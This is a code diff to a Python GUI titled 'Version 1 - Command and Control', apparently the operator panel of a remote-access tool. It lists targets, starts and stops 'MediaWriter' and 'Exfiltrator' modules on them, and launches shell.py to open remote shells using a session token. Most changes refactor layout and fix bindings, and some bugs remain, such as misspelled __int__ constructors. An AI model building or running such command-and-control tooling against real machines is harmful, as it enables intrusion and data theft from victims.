@@ -13,7 +13,7 @@ from PIL import Image, ImageTk
 
 class CoreActionsFrame(ctk.CTkFrame):
     def __int__(self, master):
-        super()
+        ctk.CTkFrame.__init__(self, master)
 
         self.columnconfigure(0, weight=1)
         self.columnconfigure(1, weight=1)
@@ -21,24 +21,45 @@ class CoreActionsFrame(ctk.CTkFrame):
         self.rowconfigure(1, weight=1)
         self.rowconfigure(2, weight=1)
 
+
+class ActionsFrame(ctk.CTkFrame):
+    def __init__(self, master):
+        ctk.CTkFrame.__init__(self, master, fg_color="transparent")
+
+        self.rowconfigure(0, weight=1)
+        self.rowconfigure(1, weight=1)
+        self.rowconfigure(2, weight=1)
+        self.columnconfigure(0, weight=1)
+
+
+class TimeoutFrame(ctk.CTkFrame):
+    def __init__(self, master):
+        ctk.CTkFrame.__init__(self, master, fg_color="transparent")
+
+        self.columnconfigure(0, weight=1)
+        self.columnconfigure(1, weight=1)
+        self.rowconfigure(0, weight=1)
+        self.rowconfigure(1, weight=1)
+
+
 class HelperActionsFrame(ctk.CTkFrame):
     def __init__(self, master):
-        super()
+        ctk.CTkFrame.__init__(self, master, fg_color="transparent")
 
-        self.master = master
         self.columnconfigure(0, weight=1)
         self.columnconfigure(1, weight=1)
 
+
 class TargetsFrame(ctk.CTkScrollableFrame):
     def __int__(self, master):
-        super.__init__()
+        ctk.CTkFrame.__init__(self, master)
 
         self.columnconfigure(0, weight=1)
         self.columnconfigure(1, weight=1)
         self.columnconfigure(2, weight=1)
 
-class AdminPanel:
 
+class AdminPanel:
     def __init__(self, session_token, api_url):
         ctk.set_appearance_mode("dark")
         ctk.set_default_color_theme("themes/lizard.json")
@@ -47,6 +68,8 @@ class AdminPanel:
         self.session_token = session_token
         self.api_url = api_url
         self._job = None
+        self.modules = ["MediaWriter", "Exfiltrator"]
+        self.supported_terminals = ["cmd", "qterminal"]
 
         self.window = ctk.CTk()
         self.window.title("Version 1 - Command and Control")
@@ -54,11 +77,6 @@ class AdminPanel:
         self.window.eval("tk::PlaceWindow . Center")
         self.window.resizable(False, False)
         self.window.config(bg="#292b2f")
-
-        self.modules = [
-            "MediaWriter",
-            "Exfiltrator"
-        ]
 
         self.window.columnconfigure(0, weight=1)
         self.window.columnconfigure(1, weight=1)
@@ -72,7 +90,6 @@ class AdminPanel:
                                         compound=ctk.LEFT)
         self.logo_holder.grid(row=0, column=0, padx=(20, 0), sticky="w")
 
-
         self.targets_frame = TargetsFrame(self.window, orientation="vertical")
         self.targets_frame.grid(row=1, column=0)
 
@@ -81,18 +98,10 @@ class AdminPanel:
         self.loginuser = ctk.CTkLabel(self.targets_frame, text="loggedin_user")
         self.loginuser.grid(row=0, column=1, padx=10, pady=10)
 
-        self.actions_frame = ctk.CTkFrame(self.window, fg_color="transparent")
-        self.actions_frame.rowconfigure(0, weight=1)
-        self.actions_frame.rowconfigure(1, weight=1)
-        self.actions_frame.rowconfigure(2, weight=1)
-        self.actions_frame.columnconfigure(0, weight=1)
+        self.actions_frame = ActionsFrame(self.window)
         self.actions_frame.grid(row=1, column=1)
 
-        self.timeout_frame = ctk.CTkFrame(self.actions_frame, fg_color="transparent")
-        self.timeout_frame.columnconfigure(0, weight=1)
-        self.timeout_frame.columnconfigure(1, weight=1)
-        self.timeout_frame.rowconfigure(0, weight=1)
-        self.timeout_frame.rowconfigure(1, weight=1)
+        self.timeout_frame = TimeoutFrame(self.actions_frame)
         self.timeout_frame.grid(row=0, column=0)
 
         self.timeout_lbl = ctk.CTkLabel(self.timeout_frame, text="0", fg_color="white", font=("Arial", 10, "bold"),
@@ -100,7 +109,7 @@ class AdminPanel:
         self.timeout_lbl.grid(row=0, column=0)
         self.timeout_slider = ctk.CTkSlider(self.timeout_frame, from_=10, to=60, number_of_steps=5)
         self.timeout_slider.grid(row=1, column=0, pady=(0, 5))
-        self.timeout_update_btn = ctk.CTkButton(self.timeout_frame, text="Update", fg_color="transparent", border_width=2,
+        self.timeout_update_btn = ctk.CTkButton(self.timeout_frame, text="Set Timeout", fg_color="transparent", border_width=2,
                                                 border_color="#306844", text_color="#306844", width=35, corner_radius=20,
                                                 hover_color="white", command=self.update_timeout)
         self.timeout_update_btn.grid(row=1, column=1, padx=5, pady=10)
@@ -110,19 +119,24 @@ class AdminPanel:
 
         self.selected_module = ctk.StringVar()
         self.selected_module.set("MediaWriter")
-        self.modules_dropdown = ctk.CTkOptionMenu(self.core_actions_frame, values=self.modules)
+        self.modules_dropdown = ctk.CTkOptionMenu(self.core_actions_frame, values=self.modules, variable=self.selected_module)
         self.modules_dropdown.grid(row=0, column=0, columnspan=2, padx=5, pady=5, sticky="w")
 
         self.stop_btn = ctk.CTkButton(self.core_actions_frame, text="Stop")
         self.stop_btn.grid(row=1, column=0, padx=5, pady=5)
         self.start_btn = ctk.CTkButton(self.core_actions_frame, text="Start")
         self.start_btn.grid(row=1, column=1, padx=5, pady=5)
-        self.shell_btn = ctk.CTkButton(self.core_actions_frame, text="Shell", command=self.start_shell)
-        self.shell_btn.grid(row=2, column=0, padx=5, pady=5)
 
-        self.helper_actions_frame = ctk.CTkFrame(self.actions_frame, fg_color="transparent")
-        self.helper_actions_frame.columnconfigure(0, weight=1)
-        self.helper_actions_frame.columnconfigure(1, weight=1)
+        self.default_terminal = ctk.StringVar()
+        self.default_terminal.set("cmd")
+        self.default_terminal_menu = ctk.CTkOptionMenu(self.core_actions_frame, values=self.supported_terminals,
+                                                       variable=self.default_terminal)
+        self.default_terminal_menu.grid(row=2, column=0)
+
+        self.shell_btn = ctk.CTkButton(self.core_actions_frame, text=f"Run", command=self.start_shell)
+        self.shell_btn.grid(row=2, column=1, padx=5, pady=5)
+
+        self.helper_actions_frame = HelperActionsFrame(self.actions_frame)
         self.helper_actions_frame.grid(row=2, column=0, pady=20)
 
         self.refresh_targets_btn = ctk.CTkButton(self.helper_actions_frame, text="Refresh Targets", text_color="#151515",
@@ -138,8 +152,8 @@ class AdminPanel:
         self.timeout_slider.bind("<Visibility>", lambda: self.timeout_lbl.configure(text=self.timeout_slider.get()))
         self.window.bind("<Visibility>", self.show_listeners())
         self.credits.bind("<Button-1>", lambda action: self.visit_credits("https://www.flaticon.com/free-icons/command"))
-        self.stop_btn.bind("<Button-1>", self.toggle_module(self.modules_dropdown.get(), False))
-        self.start_btn.bind("<Button-1>", self.toggle_module(self.modules_dropdown.get(), True))
+        self.stop_btn.bind("<Button-1>", lambda action: self.toggle_module(self.selected_module.get(), False))
+        self.start_btn.bind("<Button-1>", lambda action: self.toggle_module(self.selected_module.get(), True))
 
         self.window.mainloop()
 
@@ -147,14 +161,21 @@ class AdminPanel:
         try:
             targets = self.fetch_selected_targets()
             if not targets:
-                messagebox.showinfo("No targets selected.")
+                messagebox.showinfo("No targets.", "No targets selected.")
                 return
 
             for target in targets:
-                shell = threading.Thread(target=lambda: os.system(f"python shell.py -api {self.api_url} -session {self.session_token} -target {target}"))
-                shell.start()
-                # os.system(f"python shell.py -api {self.api_url} -session {self.session_token} -target {widget._text}")
+                match self.default_terminal.get():
+                    case "cmd":
+                        shell = threading.Thread(target=lambda: os.system(f"start cmd /c python shell.py -api {self.api_url} -session {self.session_token} -target {target}"))
+                        shell.start()
 
+                    case "qterminal":
+                        shell = threading.Thread(target=lambda: os.system(f"start cmd /c python shell.py -api {self.api_url} -session {self.session_token} -target {target}"))
+                        shell.start()
+
+                    case _:
+                        pass
         except Exception:
             messagebox.showerror("Unexpected error starting shell.py.")
 
@@ -186,12 +207,12 @@ class AdminPanel:
         self.httpClient.std_timeout = int( self.timeout_slider.get() )
 
     def toggle_module(self, module_name, do_start):
-        print("Time is time.")
         cmd = "start" if do_start else "stop"
 
         targets = self.fetch_selected_targets()
         threads = []
         threads_count = 0
+        print("Toggling stop ", module_name)
         for target in targets:
             match module_name:
                 case "MediaWriter":
